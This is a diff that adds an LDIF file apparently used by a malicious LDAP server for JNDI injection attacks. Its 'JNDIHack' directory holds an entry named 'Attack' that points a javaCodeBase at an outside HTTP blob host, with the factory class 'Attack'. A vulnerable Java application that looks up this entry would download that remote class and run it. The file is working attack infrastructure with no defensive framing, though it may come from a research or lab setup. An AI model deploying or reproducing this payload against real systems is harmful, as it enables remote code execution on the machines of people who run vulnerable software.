@@ -1,0 +1,19 @@
+dn: o=JNDIHack
+o: JNDIHack
+objectclass: top
+objectclass: organization
+
+dn: ou=Objects, o=JNDIHack
+ou: Objects
+objectclass: top
+objectclass: organizationalunit
+
+dn: cn=Attack,ou=Objects,o=JNDIHack
+javaClassName: Attack
+javaCodeBase:  http://shutdownpublic.blob.core.windows.net/misc/
+javaFactory: Attack
+objectclass: javaObject
+objectclass: javaNamingReference
+cn: Attack
+
+
